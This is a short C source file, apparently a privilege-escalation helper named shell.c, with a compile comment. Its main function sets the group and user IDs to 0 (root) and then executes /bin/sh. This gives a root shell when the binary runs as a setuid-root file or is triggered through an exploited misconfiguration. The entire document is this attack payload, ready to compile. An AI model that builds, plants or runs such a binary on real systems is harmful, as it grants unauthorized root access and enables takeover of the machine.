// Compile x64: gcc -o <output_file> shell.c 
#define NULL 0

int main(){
	setgid(0);
	setuid(0);
	execl("/bin/sh","sh",NULL);
}
